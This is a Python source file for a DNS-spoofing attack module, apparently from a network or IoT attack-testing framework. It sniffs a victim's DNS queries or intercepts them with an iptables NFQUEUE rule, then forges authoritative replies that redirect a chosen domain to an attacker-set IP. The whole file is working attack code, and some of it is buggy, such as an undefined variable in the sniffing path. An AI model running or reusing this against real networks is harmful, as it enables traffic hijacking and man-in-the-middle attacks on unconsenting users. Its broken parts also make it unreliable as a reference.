import logging

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from generic_attack import *
from scapy.all import *
import logging
log = logging.getLogger(__name__)
import threading
import traceback
import os
import platform

class DnsSpoof(GenericAttack):
    """DNS spoofing class
    """
    global domain
    global localIP
    global queue
    domain = 'test.com'  # domain to be spoofed
    localIP = 'local'  # IP address for poisoned hosts.


    def __init__(self, attackName, attackConfig, deviceConfig):
        super(DnsSpoof, self).__init__(attackName, attackConfig, deviceConfig)

    def dns_sniffer(self):
        """Listen for DNS packets
        """
        filter_str = "udp and port 53"
        victim = self.device['ip']

        if victim is not None:
            filter_str += " and src %s" % victim

        sniff(filter=filter_str, store=0, prn=self.spoof_dns,
              stop_filter=self.test_stop)

    def spoof_dns(self, pkt):
        """Receive packets and spoof if necessary
        """
        global domain
        global localIP
        if not pkt.haslayer(DNSQR):
            pass
        else:
            if domain in pkt[DNS].qd.qname:
                spoofed_pkt = Ether(src=p[Ether].dst, dst=p[Ether].src) / \
                              IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                              UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                              DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, \
                                  an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=localIP))
                sendp(spoofed_pkt, count=1)

                log.info("%s spoofed with %s" % (pkt[DNS].qd.qname, domain))
            log.info("%s spoofed with" % (pkt[DNS].qd.qname))
        # if DNSQR in pkt and pkt[Ether].src != self.local_mac:
        #     for dns in self.dns_spoofed_pair.keys():
        #         tmp = dns.search(pkt[DNSQR].qname)
        #         if not tmp is None and not tmp.group(0) is None:
        #             # p = Ether(dst=pkt[Ether].src, src=self.local_mac)
        #             # p /= IP(src=pkt[IP].dst, dst=pkt[IP].src)
        #             # p /= UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)
        #             # p /= DNS(id=pkt[DNS].id, qr=1L, rd=1L, ra=1L,
        #             #          an=DNSRR(rrname=pkt[DNS].qd.qname, type='A',
        #             #                   rclass='IN', ttl=40000,
        #             #                   rdata=localIP), qd=pkt[DNS].qd)
        #             sendp(p, count=1)


        del (pkt)

    def callback(self, packet):
        if not self.running:
            global queue
            try:
                queue.unbind()
                return
            except Exception, j:
                log.error('Error unbinding DNS' % (j, traceback.format_exc()))
                return

        payload = packet.get_payload()
        pkt = IP(payload)
        global domain
        global localIP
        if not pkt.haslayer(DNSQR):
            packet.accept()
        else:
            if domain in pkt[DNS].qd.qname:
                spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                              UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                              DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, \
                                  an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=localIP))
                packet.set_payload(str(spoofed_pkt))
                packet.accept()
                log.info("%s q-spoofed with %s" %(pkt[DNS].qd.qname, domain))
            else:
                packet.accept()

    def initialize(self, result):
        if platform.system() == "Darwin":
            pass
        else:
            os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1')
        global domain
        global localIP


        localIP = self.config["poisoned_ip"]
        domain = self.config["domain"]
        self.running = True

        if platform.system() == "Darwin":
            thread = threading.Thread(target=self.dns_sniffer)
            thread.start()
            thread.join()

        else:
            global queue
            from netfilterqueue import NetfilterQueue
            queue = NetfilterQueue()
            queue.bind(1, self.callback)
            try:
                queue.run()  # Main loop
            except KeyboardInterrupt:
                queue.unbind()
                # os.system('iptables -F')
                # os.system('iptables -X')
        return

    def test_stop(self, pkt):
        """ Callback for stopping a sniffer
        """
        if self.running:
            return False

        return True

    def shutdown(self):
        self.running = False
        if platform.system() == "Darwin":
            pass
        else:
            global queue
            try:
                queue.unbind()
                # os.system('iptables -F')
                # os.system('iptables -X')
            except Exception, j:
                log.error('Error unbinding DNS' % (j, traceback.format_exc()))
                pass


        return True

